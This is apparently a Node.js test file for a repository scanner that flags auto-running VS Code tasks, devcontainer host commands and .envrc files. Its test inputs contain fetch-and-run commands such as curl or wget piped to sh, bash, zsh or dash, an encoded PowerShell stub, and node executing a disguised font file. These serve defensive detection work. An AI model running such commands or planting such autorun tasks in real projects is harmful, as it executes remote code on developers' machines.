import { test } from 'node:test';
import assert from 'node:assert/strict';
import { detect, RULE } from '../skills/repoflags/scripts/lib/rules/editor.mjs';
import * as fx from './fixtures/editor-cases.mjs';

function run(map) {
  const files = new Map(Object.entries(map).map(([k, v]) => [k, { text: v, size: v.length }]));
  return detect(files, { options: {}, addSecret: () => {} });
}

test('tasks.json folderOpen with comments and trailing commas is high at the runOn line', () => {
  const r = run({ '.vscode/tasks.json': fx.TASKS_JSONC });
  assert.equal(r.signals.length, 1);
  const s = r.signals[0];
  assert.equal(s.rule, RULE);
  assert.equal(s.severity, 'high');
  assert.equal(s.file, '.vscode/tasks.json');
  assert.equal(s.line, 9);
  for (const part of ['runOn: folderOpen', 'reveal: never', 'node on non-JS file', 'node .vscode/font.woff2']) {
    assert.ok(s.evidence.includes(part), `${part} in ${s.evidence}`);
  }
  assert.deepEqual(r.notVerified, []);
});

test('200 spaces before command do not hide it', () => {
  const r = run({ '.vscode/tasks.json': fx.TASKS_SPACES });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].severity, 'high');
  assert.ok(r.signals[0].evidence.includes('node .vscode/font.woff2'));
  assert.ok(!/ {2}/.test(r.signals[0].evidence));
});

test('curl piped to sh is flagged; legacy root command form is analysed', () => {
  assert.ok(run({ '.vscode/tasks.json': fx.TASKS_PIPE }).signals[0].evidence.includes('pipe to shell'));
  const l = run({ '.vscode/tasks.json': fx.TASKS_LEGACY });
  assert.equal(l.signals.length, 1);
  assert.ok(l.signals[0].evidence.includes('pipe to shell'));
});

test('args are concatenated into the command', () => {
  const r = run({ '.vscode/tasks.json': fx.TASKS_ARGS });
  assert.ok(r.signals[0].evidence.includes('node a.txt'));
  assert.ok(r.signals[0].evidence.includes('node on non-JS file'));
});

test('node on a JS file is not an extra indicator', () => {
  const r = run({ '.vscode/tasks.json': fx.TASKS_JS_OK });
  assert.equal(r.signals.length, 1);
  assert.ok(!r.signals[0].evidence.includes('non-JS'));
});

test('no runOn or runOn default: no signal; __proto__ key is ignored', () => {
  for (const t of [fx.TASKS_NO_RUNON, fx.TASKS_DEFAULT, fx.TASKS_PROTO]) {
    assert.equal(run({ '.vscode/tasks.json': t }).signals.length, 0);
  }
});

test('allowAutomaticTasks on is medium, off is nothing', () => {
  const on = run({ '.vscode/settings.json': fx.SETTINGS_ON });
  assert.equal(on.signals.length, 1);
  assert.equal(on.signals[0].rule, 'editor-autorun');
  assert.equal(on.signals[0].severity, 'medium');
  assert.equal(on.signals[0].line, 1);
  assert.equal(run({ '.vscode/settings.json': fx.SETTINGS_OFF }).signals.length, 0);
});

test('devcontainer initializeCommand is high, runs on the host', () => {
  const r = run({ '.devcontainer/devcontainer.json': fx.DEVCONTAINER_INIT });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].rule, 'devcontainer-command');
  assert.equal(r.signals[0].severity, 'high');
  assert.equal(r.signals[0].line, 3);
  assert.ok(r.signals[0].evidence.includes('runs on the host'));
});

test('devcontainer lifecycle commands in array and object forms are medium', () => {
  const a = run({ '.devcontainer.json': fx.DEVCONTAINER_ARRAY });
  assert.equal(a.signals.length, 1);
  assert.equal(a.signals[0].severity, 'medium');
  assert.ok(a.signals[0].evidence.includes('npm install'));
  const o = run({ '.devcontainer/devcontainer.json': fx.DEVCONTAINER_OBJECT });
  assert.equal(o.signals.length, 1);
  assert.equal(o.signals[0].severity, 'medium');
  assert.ok(o.signals[0].evidence.includes('x') && o.signals[0].evidence.includes('y'));
  assert.equal(run({ '.devcontainer/devcontainer.json': fx.DEVCONTAINER_CLEAN }).signals.length, 0);
});

test('.envrc is medium with the first non-empty line', () => {
  const r = run({ 'sub/.envrc': fx.ENVRC });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].rule, 'envrc');
  assert.equal(r.signals[0].severity, 'medium');
  assert.ok(r.signals[0].evidence.includes('export FOO=bar'));
  assert.equal(r.signals[0].line, 3);
});

test('detection is case-insensitive', () => {
  assert.equal(run({ '.VSCODE/TASKS.JSON': fx.TASKS_JSONC }).signals.length, 1);
});

// Contract changed by core WR-11 (handed to the rules fixer): VS Code's parser is error-tolerant, so a file that
// our strict parser refuses can still run. The notVerified entry stays; a medium signal is added.
test('malformed tasks.json becomes notVerified and a medium signal, never throws', () => {
  const r = run({ '.vscode/tasks.json': fx.TASKS_BROKEN });
  assert.equal(r.signals.length, 1);
  assert.equal(r.signals[0].rule, 'editor-autorun');
  assert.equal(r.signals[0].severity, 'medium');
  assert.deepEqual(r.notVerified, [{ check: 'editor-autorun', reason: 'unparseable JSONC: .vscode/tasks.json' }]);
});

test('core WR-11: a folderOpen task in a file broken on purpose is still high (text fallback)', () => {
  const text = '{ "tasks": [ { "label": "x", "command": "curl -s https://example.invalid/a | sh",\n "runOptions": { "runOn":\n "folderOpen" } } ] } trailing garbage';
  const r = run({ '.vscode/tasks.json': text });
  const s = r.signals.find((x) => x.severity === 'high');
  assert.ok(s, JSON.stringify(r.signals));
  assert.equal(s.rule, 'editor-autorun');
  assert.equal(s.line, 2);
  assert.ok(s.evidence.includes('runOn: folderOpen'));
});

test('core WR-11: a devcontainer broken on purpose keeps initializeCommand high and settings medium', () => {
  const dev = run({ '.devcontainer/devcontainer.json': '{ "initializeCommand": "echo hi" "image": "x" }' });
  assert.ok(dev.signals.some((s) => s.rule === 'devcontainer-command' && s.severity === 'high'), JSON.stringify(dev.signals));
  const set = run({ '.vscode/settings.json': '{ "task.allowAutomaticTasks": "on" "a": 1 }' });
  assert.ok(set.signals.some((s) => s.rule === 'editor-autorun' && s.evidence.includes('task.allowAutomaticTasks: on')), JSON.stringify(set.signals));
});

test('no "not implemented" self-declaration', () => {
  assert.ok(!run({}).notVerified.some((n) => /not implemented/.test(n.reason)));
});

test('core WR-11: the text fallback is fast and bounded on 1 MB of repeated keys', () => {
  const inputs = {
    '.devcontainer/devcontainer.json': '"initializeCommand":"'.repeat(50000),
    '.vscode/tasks.json': '"runOn":"folderOpen",'.repeat(50000),
    '.vscode/settings.json': '"task.allowAutomaticTasks":"on" '.repeat(30000),
  };
  for (const [file, text] of Object.entries(inputs)) {
    const t0 = performance.now();
    const r = run({ [file]: text });
    const ms = performance.now() - t0;
    assert.ok(ms < 500, `${file}: ${ms.toFixed(0)} ms`);
    assert.ok(r.signals.length <= 12, `${file}: ${r.signals.length} signals`);
  }
});

// ---- review rules WR-10: indicators on every pipe, any shell, node by path; devcontainer indicators first ----
const taskWith = (command) => JSON.stringify({ tasks: [{ label: 'x', type: 'shell', command, runOptions: { runOn: 'folderOpen' } }] });

test('WR-10: every pipe is checked and any shell (path, sudo, zsh, dash) counts', () => {
  for (const cmd of ['echo a | tee x; curl -s https://example.invalid/e | sh', 'curl -s https://example.invalid/e | sudo bash',
    'wget -qO- https://example.invalid/e | /bin/sh', 'curl https://example.invalid/e | zsh', 'curl https://example.invalid/e|dash']) {
    const s = run({ '.vscode/tasks.json': taskWith(cmd) }).signals[0];
    assert.ok(s.evidence.includes('pipe to shell'), cmd);
  }
});

test('WR-10: node by path or as node.exe on a non-JS file is flagged', () => {
  for (const cmd of ['node.exe .vscode/font.woff2', '/usr/bin/node .vscode/a.txt', 'C:\\tools\\node.exe a.png']) {
    const s = run({ '.vscode/tasks.json': taskWith(cmd) }).signals[0];
    assert.ok(s.evidence.includes('node on non-JS file'), cmd);
  }
});

test('WR-10: devcontainer commands get the indicators, placed before the (truncated) command', () => {
  const cmd = `echo ${'x'.repeat(150)}; curl -s https://example.invalid/e | sh`;
  const r = run({ '.devcontainer/devcontainer.json': JSON.stringify({ initializeCommand: cmd }) });
  assert.equal(r.signals.length, 1);
  assert.ok(r.signals[0].evidence.startsWith('indicator: pipe to shell'), r.signals[0].evidence);
});

// ---- review rules WR-01: the command that really runs must be in the evidence ----
const auto = (extra) => ({ label: 'x', type: 'shell', command: 'echo hi', runOptions: { runOn: 'folderOpen' }, ...extra });

test('WR-01: a platform block overriding the command is shown and analysed', () => {
  const t = JSON.stringify({ tasks: [auto({ windows: { command: 'powershell -enc AAAA' }, linux: { command: 'curl -s https://example.invalid/l | sh' } })] });
  const ev = run({ '.vscode/tasks.json': t }).signals[0].evidence;
  assert.ok(ev.includes('platform override: windows'), ev);
  assert.ok(ev.includes('powershell -enc AAAA'), ev);
  assert.ok(ev.includes('pipe to shell'), ev);
});

test('WR-01: options.shell.executable, npm script and dependsOn are shown', () => {
  const shell = run({ '.vscode/tasks.json': JSON.stringify({ tasks: [auto({ options: { shell: { executable: '.vscode/sh.bin' } } })] }) }).signals[0].evidence;
  assert.ok(shell.includes('shell: .vscode/sh.bin'), shell);
  const npm = run({ '.vscode/tasks.json': JSON.stringify({ tasks: [{ label: 'n', type: 'npm', script: 'postinstall', runOptions: { runOn: 'folderOpen' } }] }) }).signals[0].evidence;
  assert.ok(npm.includes('npm script: postinstall'), npm);
  const dep = run({ '.vscode/tasks.json': JSON.stringify({ tasks: [auto({ dependsOn: ['payload'] }), { label: 'payload', type: 'shell', command: 'curl -s https://example.invalid/d | bash' }] }) });
  assert.equal(dep.signals.length, 1);
  assert.ok(dep.signals[0].evidence.includes('dependsOn payload'), dep.signals[0].evidence);
  assert.ok(dep.signals[0].evidence.includes('pipe to shell'), dep.signals[0].evidence);
});
